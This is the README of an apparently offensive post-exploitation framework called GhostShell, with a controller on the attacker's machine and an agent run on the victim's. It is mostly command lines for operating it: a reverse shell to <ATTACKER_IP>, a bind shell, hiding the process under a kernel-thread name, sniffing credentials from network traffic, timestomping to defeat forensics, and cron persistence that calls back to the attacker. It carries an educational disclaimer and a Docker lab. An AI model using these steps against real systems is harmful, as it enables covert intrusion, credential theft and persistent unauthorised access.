# 👻 GhostShell

## Executive Summary

GhostShell is a lightweight Post-Exploitation and Operating System Manipulation framework designed for Red Teaming and Educational purposes.

**Major Update (v3.0):** The framework has been split into two distinct components:
1.  **Controller (`main.py`):** Runs on the Attacker's machine. Provides a rich CLI dashboard.
2.  **Agent (`agent.py`):** A **Zero-Dependency** standalone payload. Runs on the Victim's machine using only the standard Python library.

## 🏗️ Architecture

| Component | File | Role | Dependencies |
|---|---|---|---|
| **Controller** | `main.py` | Attacker Interface (C2) | `typer`, `rich`, `setproctitle` |
| **Agent** | `agent.py` | Victim Payload | **NONE** (Standard Lib only) |

---

## 🚀 Installation & Setup

### 1. Attacker Machine (Windows/Linux/macOS)
This is where you control the operation.

```bash
# Clone the repository
git clone https://github.com/MariusZmr/GhostShell.git
cd GhostShell

# Install dependencies (Controller only)
pip install -r requirements.txt
```

### 2. Victim Machine (The Target)
**No installation required.** You only need to transfer the `agent.py` file.

```bash
# Example transfer (if using Docker lab)
docker cp agent.py <container_id>:/tmp/agent.py
```

---

## 🎮 Usage Scenarios

### Scenario 1: Reverse Shell (Standard)
The victim connects back to the attacker. Bypasses inbound firewalls.

1.  **Attacker:** Start the listener.
    ```bash
    python main.py listener --port 4444
    ```
2.  **Victim:** Execute the agent to connect back.
    ```bash
    python3 agent.py connect <ATTACKER_IP> --port 4444
    ```

### Scenario 2: Bind Shell (Fallback)
Open a port on the victim and wait for the attacker.

1.  **Victim:** Open the port.
    ```bash
    python3 agent.py listen --port 5555
    ```
2.  **Attacker:** Connect to the victim.
    ```bash
    python main.py handler <VICTIM_IP> 5555
    ```

### Scenario 3: Stealth & Evasion (Process Masquerading)
Hide the python process from `ps` and `top` commands.

*   **Victim:** Add the `--name` flag when connecting.
    ```bash
    python3 agent.py connect <IP> --name "kworker/u4:0"
    ```
    *Note: This uses purely native `ctypes` (libc prctl) calls on Linux. No external libraries needed.*

### Scenario 4: Local Audit (Privilege Escalation)
Perform a quick audit of the system without establishing a connection.

*   **Victim:**
    ```bash
    python3 agent.py audit
    ```
    *   Checks Kernel version for Dirty Pipe/Cow.
    *   Scans for dangerous SUID binaries (GTFOBins).

### Scenario 5: Network Sniffer
Capture credentials from cleartext traffic (requires Root).

*   **Victim:**
    ```bash
    python3 agent.py sniff --interface eth0 --count 20
    ```
    *If `eth0` is not found, the agent will list available interfaces.*

### Scenario 6: Anti-Forensics (Timestomping)
Modify file timestamps to hide modification dates.

*   **Victim:**
    ```bash
    # Clone timestamp from a system file (e.g., /bin/bash)
    python3 agent.py timestomp /path/to/malware.py --ref /bin/bash
    ```

### Scenario 7: Persistence
Ensure the agent restarts on reboot.

*   **Victim:**
    ```bash
    python3 agent.py persist --method cron --payload "python3 /tmp/agent.py connect <ATTACKER_IP>"
    ```

---

## 🛠️ Development (Docker Lab)

To test safely without a second machine, use the included Docker setup.

```bash
# 1. Start the Victim Container
docker-compose up -d --build

# 2. Enter the Victim Container (to simulate the victim)
docker-compose exec ghostshell bash

# 3. (Inside Docker) Run the agent
python3 agent.py connect host.docker.internal
```

---

## ⚖️ Disclaimer

This software was created **strictly for educational purposes**. The author is not responsible for any misuse of this utility. Always obtain permission before testing on networks you do not own.
